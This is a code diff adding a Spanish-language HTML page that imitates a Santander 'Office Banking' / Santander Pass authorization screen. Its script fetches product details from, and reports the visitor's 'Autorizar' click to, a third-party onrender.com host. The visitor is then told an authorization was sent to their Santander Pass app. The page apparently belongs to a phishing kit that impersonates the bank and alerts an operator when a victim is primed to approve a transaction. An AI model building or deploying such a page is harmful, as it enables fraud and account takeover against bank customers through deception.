@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Autorización Santander Pass</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .btn-santander {
+      background-color: red;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    #mensajeAutorizacion {
+      color: red;
+      font-weight: bold;
+      margin-top: 15px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+
+    <h2>Autorización Santander Pass</h2>
+    <p>Producto seleccionado: <span id="productoSeleccionado"></span></p>
+
+    <button id="autorizarBtn" class="btn-santander">Autorizar</button>
+    <div id="mensajeAutorizacion"></div>
+  </div>
+
+  <script>
+    const API_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/config";
+    const AUTORIZAR_URL = "https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar";
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const seleccion = localStorage.getItem("seleccionProducto");
+
+      fetch(API_URL)
+        .then(res => res.json())
+        .then(data => {
+          let producto = "";
+
+          if(seleccion === "linea"){
+            producto = data.producto1 || "";
+          } else if(seleccion === "tarjeta"){
+            producto = data.producto2 || "";
+          }
+
+          document.getElementById("productoSeleccionado").innerText = producto;
+        })
+        .catch(err => {
+          console.error("Error al cargar configuración:", err);
+          document.getElementById("productoSeleccionado").innerText = "⚠️ No se pudo cargar producto.";
+        });
+    });
+
+    document.getElementById("autorizarBtn").addEventListener("click", async () => {
+      const producto = document.getElementById("productoSeleccionado").innerText;
+
+      const mensaje = `Autoriza!!!\nProducto: ${producto}`;
+
+      try {
+        await fetch(AUTORIZAR_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje })
+        });
+
+        document.getElementById("mensajeAutorizacion").innerText = 
+          "Hemos enviado una autorización a tu App Santander Pass";
+      } catch (error) {
+        console.error("Error al enviar autorización:", error);
+        document.getElementById("mensajeAutorizacion").innerText = 
+          "⚠️ No se pudo enviar la autorización.";
+      }
+    });
+  </script>
+</body>
+</html>
